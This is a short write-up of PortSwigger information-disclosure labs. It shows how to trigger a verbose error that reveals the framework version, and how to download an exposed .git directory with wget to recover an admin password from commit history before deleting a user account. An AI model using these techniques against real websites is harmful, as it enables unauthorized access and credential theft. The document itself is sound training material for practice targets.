# Information disclosure vulnerabilities

Get details at [here](https://portswigger.net/web-security/information-disclosure)

---

[Lab 1](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-error-messages)

Description of this lab: obtain and submit the version number of this framework

Go to any post and modify url with unique symbol like this `example.com/product?productId=!` and it returns a lot of errors and show version of framework `Apache Struts 2 2.3.31`, return homepage and submit with version we found, then solved the lab.

[Lab 2](#)

[Lab 3](#)

[Lab 4](#)

[Lab 5](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history)

Description of this lab: obtain the password for the administrator user then log in and delete Carlos's account, exploit version control history

The information of version control history is in folder .git, try to modify url `example.com/.git` and we got a file manager. Using `wget -r` (save data as directory) in Linux distro to get `.git` file. Firstly, use `git status`, we can see that, `admin.conf` and `admin_panel.php`. We need to see old commits. Nextly, use `git log` and it returns this result:

```
    commit 03936237f9151467ed926618e388a2017b88a1e7 (HEAD -> master)
    Author: Carlos Montoya <carlos@evil-user.net>
    Date:   Tue Jun 23 14:05:07 2020 +0000

        Remove admin password from config

    commit 68155dd4dfccb8a580d95b16db1b68d7b963ddc0
    Author: Carlos Montoya <carlos@evil-user.net>
    Date:   Mon Jun 22 16:23:42 2020 +0000

        Add skeleton admin panel
```

Then, see commit `68155dd4dfccb8a580d95b16db1b68d7b963ddc0` with `git show 68155dd4dfccb8a580d95b16db1b68d7b963ddc0`

```
    commit 68155dd4dfccb8a580d95b16db1b68d7b963ddc0
    Author: Carlos Montoya <carlos@evil-user.net>
    Date:   Mon Jun 22 16:23:42 2020 +0000

        Add skeleton admin panel

    diff --git a/admin.conf b/admin.conf
    new file mode 100644
    index 0000000..12f1f74
    --- /dev/null
    +++ b/admin.conf
    @@ -0,0 +1 @@
    +ADMIN_PASSWORD=ghjjaciebqxzptna80o9
    diff --git a/admin_panel.php b/admin_panel.php
    new file mode 100644
    index 0000000..8944e3b
    --- /dev/null
    +++ b/admin_panel.php
    @@ -0,0 +1 @@
    +<?php echo 'TODO: build an amazing admin panel, but remember to check the password!'; ?>
    \ No newline at end of file
```
This result including admin password `ghjjaciebqxzptna80o9`, log in with this password and delete carlos and solved the lab.